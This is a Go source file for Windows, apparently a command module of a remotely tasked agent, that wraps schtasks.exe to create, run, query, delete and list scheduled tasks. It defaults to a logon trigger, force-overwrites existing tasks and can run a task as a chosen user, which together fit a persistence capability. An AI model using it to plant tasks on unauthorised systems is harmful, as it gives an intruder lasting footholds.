//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

type SchtaskCommand struct{}

func (c *SchtaskCommand) Name() string {
	return "schtask"
}

func (c *SchtaskCommand) Description() string {
	return "Create, query, run, or delete scheduled tasks"
}

type schtaskArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	Program string `json:"program"`
	Args    string `json:"args"`
	Trigger string `json:"trigger"`
	Time    string `json:"time"`
	User    string `json:"user"`
	RunNow  bool   `json:"run_now"`
}

func (c *SchtaskCommand) Execute(task structs.Task) structs.CommandResult {
	var args schtaskArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required (action, name)",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "create":
		return schtaskCreate(args)
	case "query":
		return schtaskQuery(args)
	case "delete":
		return schtaskDelete(args)
	case "run":
		return schtaskRun(args)
	case "list":
		return schtaskList()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: create, query, delete, run, list", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func schtaskCreate(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output:    "Error: name is required for task creation",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Program == "" {
		return structs.CommandResult{
			Output:    "Error: program is required for task creation",
			Status:    "error",
			Completed: true,
		}
	}

	trigger := args.Trigger
	if trigger == "" {
		trigger = "ONLOGON"
	}

	// Build schtasks /Create command
	cmdArgs := []string{
		"/Create",
		"/TN", args.Name,
		"/TR", buildTaskCommand(args.Program, args.Args),
		"/SC", trigger,
		"/F", // Force — overwrite if exists
	}

	// Add time parameter for time-based triggers
	switch strings.ToUpper(trigger) {
	case "DAILY", "WEEKLY", "MONTHLY", "ONCE":
		if args.Time != "" {
			cmdArgs = append(cmdArgs, "/ST", args.Time)
		}
	}

	// Run as specific user if provided
	if args.User != "" {
		cmdArgs = append(cmdArgs, "/RU", args.User)
	}

	output, err := runSchtasks(cmdArgs)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating scheduled task: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	result := fmt.Sprintf("Created scheduled task:\n  Name:    %s\n  Program: %s\n  Trigger: %s\n\n%s",
		args.Name, args.Program, trigger, output)

	// Optionally run the task immediately
	if args.RunNow {
		runOutput, runErr := runSchtasks([]string{"/Run", "/TN", args.Name})
		if runErr != nil {
			result += fmt.Sprintf("\n\nWarning: Task created but immediate run failed: %v\n%s", runErr, runOutput)
		} else {
			result += fmt.Sprintf("\n\nTask executed immediately:\n%s", runOutput)
		}
	}

	return structs.CommandResult{
		Output:    result,
		Status:    "success",
		Completed: true,
	}
}

func schtaskQuery(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output:    "Error: name is required for task query",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := runSchtasks([]string{"/Query", "/TN", args.Name, "/V", "/FO", "LIST"})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error querying task '%s': %v\n%s", args.Name, err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Task details for '%s':\n%s", args.Name, output),
		Status:    "success",
		Completed: true,
	}
}

func schtaskDelete(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output:    "Error: name is required for task deletion",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := runSchtasks([]string{"/Delete", "/TN", args.Name, "/F"})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error deleting task '%s': %v\n%s", args.Name, err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Deleted scheduled task '%s':\n%s", args.Name, output),
		Status:    "success",
		Completed: true,
	}
}

func schtaskRun(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return structs.CommandResult{
			Output:    "Error: name is required to run a task",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := runSchtasks([]string{"/Run", "/TN", args.Name})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error running task '%s': %v\n%s", args.Name, err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Triggered execution of '%s':\n%s", args.Name, output),
		Status:    "success",
		Completed: true,
	}
}

func schtaskList() structs.CommandResult {
	output, err := runSchtasks([]string{"/Query", "/FO", "TABLE", "/NH"})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error listing tasks: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Scheduled Tasks:\n%s", output),
		Status:    "success",
		Completed: true,
	}
}

func buildTaskCommand(program, args string) string {
	if args == "" {
		return program
	}
	return fmt.Sprintf("%s %s", program, args)
}

func runSchtasks(args []string) (string, error) {
	cmd := exec.Command("schtasks.exe", args...)
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}
